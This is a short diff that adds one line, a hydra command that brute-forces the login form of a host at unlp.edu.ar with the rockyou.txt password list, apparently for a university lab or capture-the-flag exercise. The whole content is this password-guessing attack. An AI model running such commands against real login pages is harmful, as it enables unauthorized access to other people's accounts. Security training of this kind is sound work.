@@ -1,0 +1,2 @@
+hydra -l EL0_F4CIL_GG} -P rockyou.txt pium-pium.dsa.linti.unlp.edu.ar https-post-form "/login:username=^USER^&password=^PASS^:Usuario o contraseña incorrectos" -t 8 -V -F -o archivo.txt
+
